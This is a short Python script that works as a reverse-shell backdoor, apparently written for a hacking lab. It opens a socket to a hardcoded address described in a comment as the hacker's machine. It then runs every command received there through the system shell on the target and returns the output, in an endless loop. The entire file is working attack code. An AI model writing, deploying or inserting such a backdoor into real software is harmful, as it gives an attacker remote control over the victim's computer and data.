import socket
#from socket import SOCK_STREAM, socket, AF_INET
import subprocess
import json

class SocketConnection:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))  # Connect to Hacker's machine
        # self.connection.send(b"Connection established...\n")

    # Sending Input
    def json_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    # Processing Input
    def json_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data.decode())

    # Getting Input by Creating a subprocess to execute on Terminal of Target
    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)

    def start_socket(self):
        while True: # Create infinite loop of execution of commands
            command = self.json_receive()
            command_output = self.command_execution(command)
            self.json_send(command_output)
        self.connection.close()


socket_connection = SocketConnection("10.0.2.10",8080)
socket_connection.start_socket()


